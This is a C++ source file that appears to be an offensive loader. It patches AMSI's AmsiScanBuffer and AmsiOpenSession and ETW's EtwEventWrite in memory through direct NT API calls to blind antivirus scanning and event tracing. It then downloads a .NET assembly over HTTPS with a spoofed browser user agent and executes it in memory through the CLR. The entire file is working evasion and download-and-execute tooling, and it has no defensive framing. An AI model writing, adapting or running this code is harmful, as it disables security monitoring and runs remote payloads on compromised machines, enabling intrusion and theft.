#include <fstream>
#include <vector>
#include <sstream>
#include <Windows.h>
#include <Windows.h>
#include <psapi.h>
#include <iostream>
#include <tchar.h>
#pragma comment(lib, "ntdll")
#include "stdlib.hpp"
#include "CLR.hpp"
#include "winhttp.hpp"

using namespace std;

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PS_ATTRIBUTE
{
    ULONG  Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

void patchAMSI(OUT HANDLE& hProc) {

    void* amsiAddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");

    char amsiPatch[] = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* amsiAddr_bk = amsiAddr;


    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    std::cout << "[+] Patched amsi!\n";
}

void patchAMSIOpenSession(OUT HANDLE& hProc) {

    void* amsiAddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiOpenSession");

    char amsiPatch[] = { 0x48, 0x31, 0xC0 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* amsiAddr_bk = amsiAddr;


    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    std::cout << "[+] Patched amsi open session!\n";
}

void patchETW(OUT HANDLE& hProc) {

    void* etwAddr = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "EtwEventWrite");

    char etwPatch[] = { 0xC3 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* etwAddr_bk = etwAddr;
    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    std::cout << "[+] Patched etw!\n";

}

void loadAMSIdll(OUT HANDLE& hProc) {

    PVOID buf;
    const char* dllPath;
    dllPath = "C:\\Windows\\System32\\amsi.dll";


    LPVOID lpAllocationStart = nullptr;
    HANDLE dllThread = NULL;
    SIZE_T szAllocationSize = strlen(dllPath);
    LPVOID lpStartAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

    NtAllocateVirtualMemory(hProc, &lpAllocationStart, 0, (PSIZE_T)&szAllocationSize, MEM_COMMIT, PAGE_READWRITE);
    NtWriteVirtualMemory(hProc, lpAllocationStart, (PVOID)dllPath, strlen(dllPath), nullptr);
    NtCreateThreadEx(&dllThread, GENERIC_EXECUTE, NULL, hProc, lpStartAddress, lpAllocationStart, FALSE, 0, 0, 0, nullptr);

    if (dllThread == NULL) {
        std::cout << "[-] Failed to load amsi.dll\n";
    }
    else {
        WaitForSingleObject(dllThread, 1000);
    }


}

std::string read_string_from_file(const std::string& file_path) {
    const std::ifstream input_stream(file_path, std::ios_base::binary);

    if (input_stream.fail()) {
        throw std::runtime_error("Failed to open file");
    }

    std::stringstream buffer;
    buffer << input_stream.rdbuf();

    return buffer.str();
}

std::vector<unsigned char> DownloadFileA(std::string url)
{
    std::string endpoint = stdlib::SplitAndGetSubstringA(url, '/', 3);
    std::string server = stdlib::RemoveSubstringA(url, "https://");
    server = stdlib::RemoveSubstringA(server, endpoint);

    zzWinHttp::request_data rd;
    std::vector<unsigned char> data;

    rd.pwsServerName = stdlib::StringA2StringW(server);
    rd.nServerPort = INTERNET_DEFAULT_HTTPS_PORT;
    rd.pwsVerb = L"GET";
    rd.pwsObjectName = stdlib::StringA2StringW(endpoint);
    rd.pwsUserAgent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";;
    rd.pwszVersion = L"HTTP/1.1";
    rd.pwszReferrer = L"";
    rd.ppwszAcceptTypes = L"";
    rd.lpszHeaders = L"";
    rd.lpwsData = L"";
    rd.bSSL = TRUE;
    rd.bAutoProxy = TRUE;

    zzWinHttp::Request* r = new zzWinHttp::Request(rd);

    r->send(data);

    delete r;

    return data;
}

int main(int argc, char* argv[])
{
    char* mode;
    bool isPatchAMSI = true;
    bool isPatchAMSIOpenSession = false;
    bool isPatchETW = true;
    bool isLoadDll = false;
    LPSTR cmd;
    HANDLE hProc = NULL;

    hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE,
        (DWORD)GetCurrentProcessId()
    );
    loadAMSIdll(hProc);
    patchETW(hProc);
    patchAMSI(hProc);
    patchAMSIOpenSession(hProc);


    printf(" ~ Execute Remote .NET Assembly ~\n");
    std::string url = "";
    std::string args = "";

    if (argc != 3)
    {
        printf("%s <url> <assembly args>\n", argv[0]);
        return -1;
    }
    else
    {
        url = argv[1];
        args = argv[2];
    }

    std::vector<unsigned char> bytes = DownloadFileA(url);

    if (bytes.empty())
    {
        return -1;
    }
    printf("[+] Bytes: %ld\n", bytes.size());

    CLRManager::CLR clr = CLRManager::CLR();
    clr.execute_assembly(bytes, args);

    return 0;
}